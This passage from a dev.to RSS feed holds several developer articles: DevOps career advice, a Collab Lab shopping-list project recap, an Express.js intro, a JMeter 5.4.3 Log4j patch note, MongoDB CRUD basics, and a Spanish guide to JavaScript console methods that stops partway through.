&lt;p&gt;Let’s take AWS for example. You can run workloads in &lt;code&gt;us-east-1&lt;/code&gt; and set up VPC peering so you can scale the workloads to &lt;code&gt;us-west-1&lt;/code&gt;. The same thing can be done in Azure or other cloud providers. Another option is the hybrid cloud model where you’re running your workload across different cloud providers.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#repeatability-instead-of-automation"&gt;
  &lt;/a&gt;
  Repeatability Instead Of Automation
&lt;/h2&gt;

&lt;p&gt;I still remember the days when automation started to become more and more popular, many engineers thought that it would take away their jobs or that they would automate themselves out of a job.&lt;/p&gt;

&lt;p&gt;As luck would have it, automation sort of made our jobs harder.&lt;/p&gt;

&lt;p&gt;The funny thing about automation is even if something is automated, that doesn’t mean it’s better. It could simply mean that you’re literally failing or crashing something faster.&lt;/p&gt;

&lt;p&gt;Because of that, I propose a new way of thinking; instead of thinking about automation, think about repeatability.&lt;/p&gt;

&lt;p&gt;Automation is great, but as previously explained, you could end up automating an error-prone workload. The only difference is whatever you’re deploying will fail faster. Instead, when you’re thinking about automation, think to yourself &lt;em&gt;does this manual task need to be repeatable?&lt;/em&gt; A few common examples are:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;If an application is being deployed, it’ll need updates, patches, and hot fixes. That means it should be in a CICD pipeline.&lt;/li&gt;
&lt;li&gt;If you need to deploy a VM for an application to run, that means you’ll need more VMs in the future, which means you should automate the VM creation process.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Tasks should be automated, but they shouldn’t be automated just for the sake of writing a script because it looks cool. Tasks should be automated with repeatability in mind.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#think-about-leadership"&gt;
  &lt;/a&gt;
  Think About Leadership
&lt;/h2&gt;

&lt;p&gt;In one way or another, engineers need to be leaders. We can no longer just be robots that write code and make tech happen. We need to explain to leadership teams and management why we’re doing something and why it’s beneficial. We need the ability to explain what we’re doing from a technical perspective and why it’s important to the business.&lt;/p&gt;

&lt;p&gt;I’m not saying that you need to sit on a board meeting and showcase 20 PowerPoint slides, but you do need to understand the business impact of a tech decision, why it’s important to the business, and how to explain that to the leadership team.&lt;/p&gt;

&lt;p&gt;At the end of the day, management is counting on good engineers to explain situations.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#everyone-is-a-developer"&gt;
  &lt;/a&gt;
  Everyone Is A Developer
&lt;/h2&gt;

&lt;p&gt;I get heat for saying this so much, but it’s fine. I still think it’s important to say.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Everyone is a developer.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Before you close out of your web browser and never talk to me again, hear me out.&lt;/p&gt;

&lt;p&gt;There’s a notion that if you’re a developer, that means you’re building applications or you’re building the next Twitter or Instagram. This is so far from the truth.&lt;/p&gt;

&lt;p&gt;If you’re writing Terraform code, you’re a developer. If you’re writing PowerShell or Python scripts, you’re a developer. &lt;/p&gt;

&lt;p&gt;By definition, a developer is someone who creates computer software. By definition, computer software is a set of instructions that tell a computer how to work. &lt;/p&gt;

&lt;p&gt;Your code, regardless of if it's application code, infrastructure code, or automation code, is a set of instructions to tell a computer what it should be doing.&lt;/p&gt;

&lt;p&gt;In 2021 and 2022, we saw more and more engineers needing to learn how to write code. To automate tasks, make workloads repeatable, and move faster. Writing code will always be around in one way or another.&lt;/p&gt;

&lt;p&gt;Yes, you’re a developer.&lt;/p&gt;

</description>
      <category>devops</category>
      <category>engineering</category>
      <category>programming</category>
      <category>software</category>
    </item>
    <item>
      <title>The Collab Lab TCL-34 Recap</title>
      <author>Alejandro M. Coca</author>
      <pubDate>Fri, 24 Dec 2021 17:58:02 +0000</pubDate>
      <link>https://dev.to/the-collab-lab/the-collab-lab-tcl-34-recap-29mp</link>
      <guid>https://dev.to/the-collab-lab/the-collab-lab-tcl-34-recap-29mp</guid>
      <description>&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--BXyfhQe3--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9fhglp5oxp93l0zgl2mc.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--BXyfhQe3--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9fhglp5oxp93l0zgl2mc.png" alt="TCL-34 amazing team" width="880" height="493"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://the-collab-lab.codes/"&gt;The Collab Lab (TCL)&lt;/a&gt; is a non-profit organization that provides an 8-week program for early-career developers supported by volunteer mentors. It’s a great space to practice collaboration, communication skills as it was a real work environment.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#goal-the-project"&gt;
  &lt;/a&gt;
  Goal the project
&lt;/h2&gt;

&lt;p&gt;The goal of this project is to collaborate with your Collab Lab team to &lt;strong&gt;create a “smart” shopping list app&lt;/strong&gt; that learns your buying habits and helps you remember what you’re likely to need to buy on your next trip to the store.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tech stack:&lt;/strong&gt; React &amp;amp; React Hooks, Firebase, Git, GitHub, and Firebase Hosting&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#the-amazing-talented-team"&gt;
  &lt;/a&gt;
  The amazing, talented team
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://www.linkedin.com/in/isabella-soares-lima/"&gt;Isabella Soares&lt;/a&gt;: adaptability to new, different environments and good communication skills.&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://www.linkedin.com/in/mailliw-mogollon/"&gt;Mailliw Mogollon&lt;/a&gt;: a great initiative to help teammates, and always looking for new knowledge.&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://www.linkedin.com/in/susana-rd/"&gt;Susana Ruiz&lt;/a&gt;: curiosity about best practices, and working in a team.&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://www.linkedin.com/in/yanurd"&gt;Yancarlo Urdaneta&lt;/a&gt;: happy to face new challenges.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;💯 This team is an example of &lt;strong&gt;teamwork, dedication, hard work&lt;/strong&gt;, and &lt;strong&gt;a huge commitment&lt;/strong&gt; to your goals 🌟.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#features"&gt;
  &lt;/a&gt;
  Features
&lt;/h2&gt;

&lt;p&gt;Something super important to mention is that the project experience is &lt;strong&gt;fully responsive&lt;/strong&gt; (desktop &amp;amp; mobile version). They took care of every detail! 💚&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#1-addjoin-a-shopping-list"&gt;
  &lt;/a&gt;
  1. Add/join a shopping list
&lt;/h3&gt;

&lt;p&gt;They added a way to create new shopping lists that can be used to add products to buy. Also, they worked on a section where a user might write down &lt;strong&gt;a token shared&lt;/strong&gt; (for instance it should already be registered in the database and add new products to the user list).&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--aNTYkXag--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5w4dpqvqq6nita8ribcw.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--aNTYkXag--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5w4dpqvqq6nita8ribcw.png" alt="Home page" width="880" height="516"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#2-the-shopping-list-view"&gt;
  &lt;/a&gt;
  2. The Shopping list view
&lt;/h3&gt;

&lt;p&gt;This is a page where users can take a look at &lt;strong&gt;the items that they want to buy&lt;/strong&gt; and/or the items they bought already. This section includes filtering items by name and "checking" the items you have bought, so the algorithm can make &lt;strong&gt;estimations&lt;/strong&gt; based on your previous purchases.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--T7G6vMwE--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rphlqybzgqx98bbn6cgj.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--T7G6vMwE--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rphlqybzgqx98bbn6cgj.png" alt="List page" width="880" height="464"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#3-add-a-product-to-the-shopping-list"&gt;
  &lt;/a&gt;
  3. Add a product to the shopping list
&lt;/h3&gt;

&lt;p&gt;The team created &lt;strong&gt;an accessible form (a11y)&lt;/strong&gt; to let you add products to your shopping list, and allows you to pick when you are planning to buy the product (&lt;em&gt;soon, kind of soon, or not soon&lt;/em&gt;) so the algorithm can &lt;strong&gt;estimate recommendations&lt;/strong&gt; for your future purchases!.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--iN9_mpoN--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/y5nmc1phpctkzugl01dv.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--iN9_mpoN--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/y5nmc1phpctkzugl01dv.png" alt="Add item page" width="880" height="465"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#4-delete-a-product-from-the-shopping-list"&gt;
  &lt;/a&gt;
  4. Delete a product from the shopping list
&lt;/h3&gt;

&lt;p&gt;To make your life easier, the team created a feature to delete products from the shopping list so you don’t need to have information that you don’t need anymore. They focused on &lt;strong&gt;accessibility&lt;/strong&gt; to have a more inclusive experience.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--D9o3SJNI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/7fe357fncqfchfdns21x.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--D9o3SJNI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/7fe357fncqfchfdns21x.png" alt="Delete page" width="880" height="519"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You want to see their &lt;strong&gt;incredible work&lt;/strong&gt;✨. Visit their 🚀 &lt;a href="https://github.com/the-collab-lab/tcl-34-smart-shopping-list"&gt;&lt;strong&gt;GitHub repository&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#tcl34-workflow"&gt;
  &lt;/a&gt;
  TCL-34 workflow
&lt;/h2&gt;

&lt;p&gt;One of the most important parts to mention is how they built this amazing app and what they needed to work together as a team. They were a &lt;strong&gt;supportive and collaborative team&lt;/strong&gt; 🎉.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Teamwork, pair programming&lt;/li&gt;
&lt;li&gt;Sync/Async communication&lt;/li&gt;
&lt;li&gt;Project management&lt;/li&gt;
&lt;li&gt;Create Pull Requests, code reviewing&lt;/li&gt;
&lt;li&gt;Design wireframes, and user interfaces.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If you want to know more about them or the process, you can reach out to their TCL-34 mentors:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://www.linkedin.com/in/lizeth-b-230ab2112"&gt;Lizeth Bañol&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://www.linkedin.com/in/jdandrade"&gt;Juan Andrade&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Danieljara23"&gt;Daniel Jaramillo&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://www.linkedin.com/in/alejandromcocarojas/"&gt;Alejandro Coca&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;✨ The TCL-34 team has done an amazing job by creating this product in such a short amount of time and adding all the care, detail, dedication, support, and incredible teamwork that can be seen as the result of their work. 🎉🎉&lt;/p&gt;

&lt;p&gt;They did an amazing job during these weeks and you won’t regret having them on your team or company! 🏆😄&lt;/p&gt;

</description>
      <category>collablab</category>
      <category>earlycareerdevelopers</category>
      <category>webdev</category>
      <category>react</category>
    </item>
    <item>
      <title>Explore Exprees.js </title>
      <author>Iftakher Hossen</author>
      <pubDate>Fri, 24 Dec 2021 17:55:55 +0000</pubDate>
      <link>https://dev.to/iftakher_hossen/explore-expreesjs-4mjo</link>
      <guid>https://dev.to/iftakher_hossen/explore-expreesjs-4mjo</guid>
      <description>&lt;p&gt;Today we will learn about the Node.Js web application framework Express.Js.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#what-is-expressjs"&gt;
  &lt;/a&gt;
  What is Express.js?
&lt;/h3&gt;

&lt;p&gt;Express.js is a free, open-source, simple, tiniest web application framework of Node.js. It is used for backend design &amp;amp; development.  Express.js requires only JavaScript that’s why it’s easier to build single-page, multiple-page, hybrid web applications &amp;amp; API without any effort. Express.js supports MVC architecture.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#why-we-should-use-expressjs"&gt;
  &lt;/a&gt;
  Why we should use Express.js?
&lt;/h3&gt;

&lt;p&gt;JavaScript has Node.js for backend development. Node.js has many frameworks to make easier backend development. Such as Express.js, Koa.js, Meteor.js, Nest.js, Socket.io, Total.js, etc. So, if you are a JavaScript developer then it’s easier for you to use Express.js for backend development. Express.js offers simplicity, flexibility, efficiency, minimalism, and scalability that’s why it’s more popular.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#features"&gt;
  &lt;/a&gt;
  Features
&lt;/h3&gt;

&lt;p&gt;Express.js has many features. Let’s learn about them -&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Middleware - Middleware is a function that is used to get access request and response objects. &lt;/li&gt;
&lt;li&gt;Faster server-side development - Express.js provides many readymade functions from Node.js it’s made easier to develop.&lt;/li&gt;
&lt;li&gt;Routing - Express.js provides an admiringly advanced routing mechanism.&lt;/li&gt;
&lt;li&gt;Templating - Template engines allow you to build dynamic content in web applications.&lt;/li&gt;
&lt;li&gt;Debugging - Express.js has a debugging mechanism that can find bugs easily. &lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#advantages"&gt;
  &lt;/a&gt;
  Advantages
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Express.js is fast &amp;amp; easier to learn.&lt;/li&gt;
&lt;li&gt;It’s easier to configure &amp;amp; customize.&lt;/li&gt;
&lt;li&gt;Huge community support.&lt;/li&gt;
&lt;li&gt;Supported by Google V8 Engine.&lt;/li&gt;
&lt;li&gt;Easy to connect with databases such as MongoDB, MySQL, etc.&lt;/li&gt;
&lt;li&gt;Easy to integrate with different templates.&lt;/li&gt;
&lt;li&gt;Allows you to define routes based on HTTP methods &amp;amp; URLs.&lt;/li&gt;
&lt;li&gt;Easy to serve static files and resources.&lt;/li&gt;
&lt;li&gt;Flexible middleware module.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#disadvantages"&gt;
  &lt;/a&gt;
  Disadvantages
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;
There are problems with the callback or event-driven nature but the last update of Node.js brings async/await that prevents this problem.&lt;/li&gt;
&lt;li&gt;Client request problem with middleware system.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#how-to-install-express"&gt;
  &lt;/a&gt;
  How to Install Express
&lt;/h3&gt;

&lt;p&gt;Install with npm - &lt;strong&gt;&lt;code&gt;npm install express -g&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#how-to-start"&gt;
  &lt;/a&gt;
  How to Start
&lt;/h3&gt;

&lt;p&gt;First, create a directory named &lt;strong&gt;simpleExpress&lt;/strong&gt;. Change to it, and run &lt;strong&gt;&lt;code&gt;npm init&lt;/code&gt;&lt;/strong&gt;. Then install express as a dependency. In the directory create a file named index.js and write the following code. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--kBzPs1Hs--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/eyfykux7z6umkaegp1sc.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--kBzPs1Hs--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/eyfykux7z6umkaegp1sc.png" alt="Express Example Code" width="880" height="619"&gt;&lt;/a&gt;&lt;br&gt;Hello World Example with Express.js
&lt;/p&gt;

&lt;p&gt;Run the app with the following command - &lt;strong&gt;&lt;code&gt;$ node index.js&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;
Then open the browser and visit &lt;strong&gt;“localhost:5000”&lt;/strong&gt; to see the output.&lt;/p&gt;

&lt;p&gt;Visit &lt;a href="https://expressjs.com/"&gt;Express.js&lt;/a&gt; official site to read documentations and know more in details.&lt;/p&gt;

&lt;p&gt;Thanks for reading this tutorial!&lt;/p&gt;

</description>
      <category>node</category>
      <category>javascript</category>
      <category>tutorial</category>
      <category>beginners</category>
    </item>
    <item>
      <title>What's new in Apache JMeter 5.4.3?</title>
      <author>NaveenKumar Namachivayam ⚡</author>
      <pubDate>Fri, 24 Dec 2021 17:50:56 +0000</pubDate>
      <link>https://dev.to/qainsights/whats-new-in-apache-jmeter-543-54lm</link>
      <guid>https://dev.to/qainsights/whats-new-in-apache-jmeter-543-54lm</guid>
      <description>&lt;p&gt;The Apache JMeter team has released its next minor version of JMeter 5.4.3 for the Log4j security vulnerability CVE-2021-45105. In my last few articles, I have posted about &lt;a href="https://qainsights.com/log4j-vulnerability-important-note-to-performance-engineers/"&gt;Log4j Vulnerability – Important Note to Performance Engineers&lt;/a&gt;, &lt;a href="https://qainsights.com/whats-new-in-apache-jmeter-5-4-2/"&gt;What’s new in Apache JMeter 5.4.2?&lt;/a&gt;, and &lt;a href="https://qainsights.com/what-to-do-if-you-cannot-upgrade-to-jmeter-5-4-2-for-log4j-vulnerability/"&gt;What to do if you cannot upgrade to JMeter 5.4.2 for Log4j Vulnerability?&lt;/a&gt;. Let us see what's new in Apache JMeter 5.4.3.&lt;/p&gt;

&lt;h2&gt;About CVE-2021-45105&lt;/h2&gt;

&lt;p&gt;Apache Log4j2 versions 2.0-alpha1 through 2.16.0 (excluding 2.12.3) did not protect from uncontrolled recursion from self-referential lookups. This allows an attacker with control over Thread Context Map data to cause a denial of service when a crafted string is interpreted.&lt;/p&gt;

&lt;h2&gt;Apache JMeter 5.4.3&lt;/h2&gt;

&lt;p&gt;As this minor patch addresses CVE-2021-45105, it doesn't have any new and noteworthy section. There are no other bug fixes, enhancements, samplers, etc. &lt;/p&gt;

&lt;p&gt;JMeter 5.4.3 has bumped up versions of log4j from 2.16.0 to 2.17.0.&lt;/p&gt;

&lt;p&gt;To download the latest version of JMeter, head to https://jmeter.apache.org/download_jmeter.cgi&lt;/p&gt;

&lt;p&gt;Click any one of the apache-jmeter-5.4.3 flavor to download.&lt;/p&gt;

&lt;p&gt;After download the file, verify the integrity using the sha512 checksum. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://qainsights.com/wp-content/uploads/2021/12/image-36.png"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--eNDHOo9---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://qainsights.com/wp-content/uploads/2021/12/image-36.png" alt="What's new in Apache JMeter 5.4.3?" width="543" height="295"&gt;&lt;/a&gt;What's new in Apache JMeter 5.4.3?&lt;/p&gt;

&lt;h2&gt;JMeter Release process&lt;/h2&gt;

&lt;p&gt;There are multiple steps involved in releasing the newer version. Since this is a security fix, the votes are solicited for 24 hrs and closed.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://qainsights.com/wp-content/uploads/2021/12/image-37.png"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--QVfedfVW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://qainsights.com/wp-content/uploads/2021/12/image-37.png" alt="JMeter 5.4.3 votes" width="461" height="454"&gt;&lt;/a&gt;JMeter 5.4.3 votes&lt;/p&gt;

&lt;h2&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;It is recommended to update your JMeter to 5.4.3. Suppose, if you are not able to upgrade, there are workarounds mentioned in &lt;a href="https://qainsights.com/what-to-do-if-you-cannot-upgrade-to-jmeter-5-4-2-for-log4j-vulnerability/" rel="noreferrer noopener"&gt;this article&lt;/a&gt;.&lt;/p&gt;

</description>
      <category>testing</category>
      <category>performance</category>
      <category>webperf</category>
      <category>tutorial</category>
    </item>
    <item>
      <title>Short Note on CRUD Operations of MongoDB…</title>
      <author>Tonmoy Roy</author>
      <pubDate>Fri, 24 Dec 2021 17:15:45 +0000</pubDate>
      <link>https://dev.to/tonmoyrx/short-note-on-crud-operations-of-mongodb-3lj1</link>
      <guid>https://dev.to/tonmoyrx/short-note-on-crud-operations-of-mongodb-3lj1</guid>
      <description>&lt;h2&gt;
  &lt;a href="#mongodb-crud-operations"&gt;
  &lt;/a&gt;
  MongoDB CRUD Operations
&lt;/h2&gt;

&lt;p&gt;CRUD operations create, read, update, and delete documents in MongoDB.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Create Operations&lt;/em&gt;&lt;/strong&gt;&lt;br&gt;
Create or insert operations add new documents to a collection in the database. If the collection does not currently exist in the database, then insert operations will create the collection.&lt;/p&gt;

&lt;p&gt;MongoDB provides the following methods to insert documents into a collection:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;db.collection.insertOne() &lt;/li&gt;
&lt;li&gt;db.collection.insertMany() 
Here, insert operations target a single collection.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;Read Operations&lt;/strong&gt;&lt;/em&gt;&lt;br&gt;
Read operations retrieve documents from a collection in the database.&lt;/p&gt;

&lt;p&gt;MongoDB provides the following methods to read documents from a collection:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;db.collection.find()
We can specify query filters or any criteria that identify the documents to return.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;Update Operations&lt;/strong&gt;&lt;/em&gt;&lt;br&gt;
Update operations modify existing documents in a collection of the database. &lt;/p&gt;

&lt;p&gt;MongoDB provides the following methods to update documents of a collection:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;db.collection.updateOne() &lt;/li&gt;
&lt;li&gt;db.collection.updateMany() &lt;/li&gt;
&lt;li&gt;db.collection.replaceOne()
Here, update operations target a single collection.
We can also specify any criteria, or filters, that identify the documents to update.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;Delete Operations&lt;/strong&gt;&lt;/em&gt;&lt;br&gt;
Delete operations remove documents from a collection in the database. &lt;/p&gt;

&lt;p&gt;MongoDB provides the following methods to delete documents of a collection:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;db.collection.deleteOne() &lt;/li&gt;
&lt;li&gt;db.collection.deleteMany() 
Here, delete operations target a single collection.
We can specify any criteria, or filters, that identify the documents to remove.&lt;/li&gt;
&lt;/ul&gt;

</description>
      <category>beginners</category>
      <category>mongodb</category>
      <category>javascript</category>
    </item>
    <item>
      <title>No todo es console.log()</title>
      <author>Cristian Bonomo</author>
      <pubDate>Fri, 24 Dec 2021 17:13:31 +0000</pubDate>
      <link>https://dev.to/cristianbonomo/no-todo-es-consolelog-31hk</link>
      <guid>https://dev.to/cristianbonomo/no-todo-es-consolelog-31hk</guid>
      <description>&lt;p&gt;Cuando empezamos a programar en JavaScript, una de las primeras cosas que aprendemos a hacer es imprimir por consola. &lt;br&gt;
Para esto, nos enseñan el console.log(), el cual nos permite mostrar el mensaje que queramos al ejecutar nuestro código, sea en el navegador o en la terminal que utilicemos.&lt;/p&gt;

&lt;p&gt;Sin embargo, la clase console no está limitada a este único comando, ya que posee varias alternativas y funcionalidades que nos pueden resultar útiles a la hora de debuggear nuestra aplicación.&lt;/p&gt;

&lt;p&gt;Este artículo pretende ser una pequeña guía sobre estos métodos, para tener a mano en caso de que necesitemos algo un poco mas específico que simplemente mostrar algo por pantalla.&lt;/p&gt;

&lt;p&gt;Si tienen ganas de estudiar más a fondo la clase console, y que ocurre por detrás, pueden ver la &lt;a href="https://console.spec.whatwg.org/"&gt;Console API&lt;/a&gt;, la especificación sobre console a la cual los motores de JavaScript se han adaptado para proveer funcionalidades similares.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#assert"&gt;
  &lt;/a&gt;
  assert()
&lt;/h2&gt;

&lt;p&gt;Con este método, especificaremos una condición, la cual en caso de ser falsa, mostrará un mensaje por consola.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;let isActive = false;
let isActiveAgain = true;
console.assert(isActive,'Usuario deshabilitado');
console.assert(isActiveAgain,'Usuario deshabilitado!!!');

-----------------------------------------------------
cbonomo@usuario-ThinkPad-X1-Carbon-Gen-8:~/Javascript/01-fundamentos$ node console.js 
Assertion failed: Usuario deshabilitado
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#clear"&gt;
  &lt;/a&gt;
  clear()
&lt;/h2&gt;

&lt;p&gt;Este método simplemente limpíará la consola en caso de que podamos hacerlo, es otro de los comandos que aprendemos al comienzo.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#count"&gt;
  &lt;/a&gt;
  count()
&lt;/h2&gt;

&lt;p&gt;Este método logueará la cantidad de veces que realicemos una llamada a count(), util en caso de que necesitemos establecer un contador para evaluar cuantas veces utilizamos una función.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;let user = "";

function saludar() {
    console.count(user);
    return "hola " + user;
}

user = "Cristian";
saludar();
user = "Sol";
saludar();
saludar();

------------------------------
cbonomo@usuario-ThinkPad-X1-Carbon-Gen-8:~/Javascript/01-fundamentos$ node console.js 
Cristian: 1
Sol: 1
Sol: 2
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#countreset"&gt;
  &lt;/a&gt;
  countReset()
&lt;/h2&gt;

&lt;p&gt;con countReset() podemos resetear la cuenta de count()&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;let user = "";

function saludar() {
    console.count(user);
    return "hola " + user;
}

user = "Cristian";
saludar();
user = "Sol";
saludar();
saludar();
console.countReset(user); //resetea a 0 el indice Sol
saludar();

------------------------------------------------------
cbonomo@usuario-ThinkPad-X1-Carbon-Gen-8:~/Cursos/Javascript/01-fundamentos$ node console.js 
Cristian: 1
Sol: 1
Sol: 2
Sol: 1
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#debug"&gt;
  &lt;/a&gt;
  debug()
&lt;/h2&gt;

&lt;p&gt;imprime un mensaje en la consola a nivel de debug, el cual sera solo mostrado si la consola esta configurada para mostrar esta salida. En la consola de Google Chrome, por ejemplo, solo se vera si activamos la opcion Verbose en los Default Levels, en Node se muestra por defecto.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;console.debug('Error printing data');
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#dir"&gt;
  &lt;/a&gt;
  dir()
&lt;/h2&gt;

&lt;p&gt;Mediante dir(), podemos mostrar una lista interactiva de propiedades de un objeto JavaScript. Es un método bastante útil para poder ver las propiedades de un objeto.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;console.dir(console);

--------------------------
Object [console] {
  log: [Function: log],
  warn: [Function: warn],
  dir: [Function: dir],
  time: [Function: time],
  timeEnd: [Function: timeEnd],
  timeLog: [Function: timeLog],
  trace: [Function: trace],
  assert: [Function: assert],
  clear: [Function: clear],
  count: [Function: count],
  countReset: [Function: countReset],
  group: [Function: group],
  groupEnd: [Function: groupEnd],
  table: [Function: table],
  debug: [Function: debug],
  info: [Function: info],
  dirxml: [Function: dirxml],
  error: [Function: error],
  groupCollapsed: [Function: groupCollapsed],
  Console: [Function: Console],
  profile: [Function: profile],
  profileEnd: [Function: profileEnd],
  timeStamp: [Function: timeStamp],
  context: [Function: context]
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#dirxml"&gt;
  &lt;/a&gt;
  dirxml()
&lt;/h2&gt;

